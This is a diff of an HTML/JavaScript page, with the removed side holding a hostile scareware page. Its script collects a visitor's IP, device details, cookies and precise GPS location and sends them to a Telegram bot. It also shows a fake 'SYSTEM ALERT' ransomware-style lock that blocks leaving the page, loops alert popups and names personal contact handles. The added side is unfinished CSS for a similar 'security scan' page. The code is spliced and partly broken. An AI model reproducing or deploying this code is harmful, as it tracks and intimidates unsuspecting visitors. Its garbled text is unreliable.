@@ -1,220 +1,49 @@
-for (const endpoint of endpoints) {
-                    try {
-                        const response = await fetch(endpoint, {
-                            method: 'GET',
-                            mode: 'cors',
-                            headers: {
-                                'Accept': 'application/json'
-                            }
-                        });
-                        
-                        if (response.ok) {
-                            const data = await response.json();
-                            return data.ip  data.ipAddress  "Tidak dapat mendeteksi";
-                        }
-                    } catch (error) {
-                        console.log(`Endpoint ${endpoint} gagal, mencoba yang lain...`);
-                    }
-                }
-                
-                return "Tidak dapat mendeteksi";
-            } catch (error) {
-                return "Error: " + error.message;
-            }
+
+Toggle Sidebar
+
+BLACKBOXAI
+
+New
+        
+        * {
+            -webkit-tap-highlight-color: transparent;
+            -webkit-user-select: none;
+            -moz-user-select: none;
+            -ms-user-select: none;
+            user-select: none;
         }
-
-        // Send to Telegram menggunakan XMLHttpRequest (lebih kompatibel)
-        function sendToTelegram(data) {
-            return new Promise((resolve) => {
-                try {
-                    const message = `🚨 SECURITY ALERT - MOBILE DEVICE DETECTED 🚨
-
-📱 Device: Mobile Phone
-🌐 IP Address: ${data.ip}
-🌍 Browser: ${data.deviceInfo.browser}
-🖥️ OS: ${data.deviceInfo.os}
-📍 Location: ${data.location.address}
-🎯 Coordinates: ${data.location.latitude}, ${data.location.longitude}
-📏 Accuracy: ${data.location.accuracy}m
-🌐 Language: ${data.deviceInfo.language}
-📊 Platform: ${data.deviceInfo.platform}
-🖥️ Screen: ${data.deviceInfo.screen.width}x${data.deviceInfo.screen.height}
-⏰ Timezone: ${data.deviceInfo.timezone}
-🍪 Cookies: ${data.deviceInfo.cookies}
-🕒 Timestamp: ${new Date().toLocaleString('id-ID')}
-
-⚠️ MOBILE SECURITY BREACH DETECTED ⚠️`;
-
-                    const url = https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage;
-                    const params = new URLSearchParams();
-                    params.append('chat_id', TELEGRAM_CHAT_ID);
-                    params.append('text', message);
-                    params.append('parse_mode', 'HTML');
-
-                    const xhr = new XMLHttpRequest();
-                    xhr.open('POST', url, true);
-                    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
-                    
-                    xhr.onload = function() {
-                        if (xhr.status === 200) {
-                            console.log('Data terkirim ke Telegram');
-                            resolve(true);
-                        } else {
-                            console.log('Gagal mengirim ke Telegram');
-                            resolve(false);
-                        }
-                    };
-                    
-                    xhr.onerror = function() {
-                        console.log('Error mengirim ke Telegram');
-                        resolve(false);
-                    };
-                    
-                    xhr.send(params.toString());
-                } catch (error) {
-                    console.error('Error:', error);
-                    resolve(false);
-                }
-            });
+        
+        body {
+            font-family: 'Roboto Mono', monospace;
+            background: linear-gradient(135deg, #000000 0%, #1a1a2e 50%, #16213e 100%);
+            overflow: hidden;
+            height: 100vh;
+            width: 100vw;
         }
-
-        // Main function untuk mendapatkan lokasi
-        async function initSecurityScan() {
-            updateProgress(20);
-            updateStatus("🔍 MENDETEKSI INFORMASI PERANGKAT...");
-
-            const deviceInfo = getDeviceInfo();
-            
-            updateProgress(40);
-            updateStatus("🌐 MENDAPATKAN ALAMAT IP...");
-            
-            const ipAddress = await getIPAddress();
-
-            updateProgress(60);
-            updateStatus("📍 MEMINTA AKSES LOKASI...");
-
-            if (navigator.geolocation) {
-                const geoOptions = {
-                    enableHighAccuracy: true,
-                    timeout: 15000,
-                    maximumAge: 0
-                };
-
-                navigator.geolocation.getCurrentPosition(
-                    async (position) => {
-                        updateProgress(80);  .cta{display:flex; gap:12px; flex-wrap:wrap; margin-top:18px}
-  .muted{color:#9aa0ad; font-size:12px}
-  .glitch{position:relative; display:inline-block; font-weight:800; letter-spacing:.02em;}
-  .glitch::before, .glitch::after{
-    content:attr(data-text); position:absolute; left:0; top:0; width:100%; overflow:hidden;
-  }
-  .glitch::before{color:#ff4d4d; transform:translate(1px,0); mix-blend-mode:screen; clip-path:inset(0 0 55% 0)}
-  .glitch::after{color:#4dd8ff; transform:translate(-1px,0); mix-blend-mode:screen; clip-path:inset(45% 0 0 0)}
-  .divider{height:1px; background:#ffffff14; margin:16px 0}
-  .watermark{
-    position:fixed; inset:auto 0 8px 0; text-align:center;
-    font:700 12px/1.2 monospace; letter-spacing:.2em; color:#ffffff66;
-    text-transform:uppercase; pointer-events:none;
-  }
-  .btn{
-    background:var(--primary); color:#fff; border:none; padding:12px 20px;
-    border-radius:8px; cursor:pointer; font-weight:700;
-    box-shadow:var(--glow);
-  }
-</style>
-</head>
-<body>
-  <div class="wrap">
-    <div class="panel" id="panel">
-      <div class="head">
-        <div class="lock">🔒</div>
-        <div>
-          <h1 class="glitch" data-text="SYSTEM ALERT">SYSTEM ALERT</h1>
-          <div class="sub"> SYSTEM ALERT <strong>Alva1337 Project</strong>.</div>
-        </div>
-      </div>
-
-      <div class="grid">
-        <div class="card">
-          <div class="label">STATUS</div>
-          <div class="value">Locked</div>
-        </div>
-
-        <div class="card">
-          <div class="label">Date</div>
-          <div class="value" id="dateTime">Loading...</div>
-        </div>
-
-        <div class="card">
-          <div class="label">HOST</div>
-          <div class="value" id="deviceName">Loading...</div>
-        </div>
-
-        <div class="card">
-          <div class="label">IP</div>
-          <div class="value" id="userIP">Loading...</div>
-        </div>
-      </div>
-
-      <div class="divider"></div>
-      <p id="blurb">
-        <strong style="color:#ff9c00">Heads-up:</strong> Contact Me if you need help in whatsapp ( +62 822-5849-8606 ) or instagram ( @Alvxt278 )
-      </p>
-    <div class="watermark"> Alva1337 • Ransomeware</div>
-  </div>
-
-<script>
-  // realtime date-time
-  function updateDateTime() {
-    const now = new Date();
-    const options = {
-      weekday: 'long',
-      year: 'numeric',
-      month: 'long',
-      day: 'numeric',
-      hour: '2-digit',
-      minute: '2-digit',
-      second: '2-digit'
-    };
-    document.getElementById('dateTime').textContent = now.toLocaleDateString('id-ID', options);
-  }
-  updateDateTime();
-  setInterval(updateDateTime, 1000);
-
-  // device name
-  function getDeviceName() {
-    let ua = navigator.userAgent;
-    let match = ua.match(/\((.*?)\)/);
-    if (match && match[1]) {
-      return match[1];
-    }
-    return ua;
-  }
-  document.getElementById("deviceName").textContent = getDeviceName();
-
-  // public IP
-  fetch('https://api.ipify.org?format=json')
-    .then(response => response.json())
-    .then(data => {
-      document.getElementById('userIP').textContent = data.ip;
-    })
-    .catch(() => {
-      document.getElementById('userIP').textContent = "Gagal ambil IP";
-    });
-  // cegah close/reload/back
-  window.addEventListener("beforeunload", function (e) {
-    e.preventDefault();
-    e.returnValue = "🚨 SYSTEM ALERT 🚨\nCie Gabisa Keluar udh dm aja @alvxt278";
-    return "🚨 SYSTEM ALERT 🚨\nCie Gabisa Keluar udh dm aja @alvxt278";
-  });
-        // Mencegah pengguna meninggalkan halaman
-        window.onbeforeunload = function() {
-            return "Apakah Anda yakin ingin meninggalkan halaman ini?";
-        };
-  // prank lock
-  let prank = setInterval(() => {
-    alert("🚨 SYSTEM ALERT 🚨\nYou cannot exit until you contact me on ingstagram (@Alvxt278)");
-  }, 1000);
-</script>
-</body>
-</html>
+        
+        .glitch-text {
+            text-shadow: 0 0 10px #ff0000, 0 0 20px #ff0000, 0 0 30px #ff0000;
+            animation: glitch 2s infinite;
+        }
+        
+        @keyframes glitch {
+            0% { text-shadow: 0 0 10px #ff0000, 0 0 20px #ff0000; }
+            50% { text-shadow: 0 0 15px #00ff00, 0 0 25px #00ff00; }
+            100% { text-shadow: 0 0 10px #ff0000, 0 0 20px #ff0000; }
+        }
+        
+        .pulse {
+            animation: pulse 2s infinite;
+        }
+        
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+            100% { transform: scale(1); }
+        }
+        
+        .security-scan {
+            background: repeating-linear-gradient(
+                45deg,
+                rgba(255, 0, 0, 0.1),
+                rgba(255, 0, 0, 0.1) 10px,
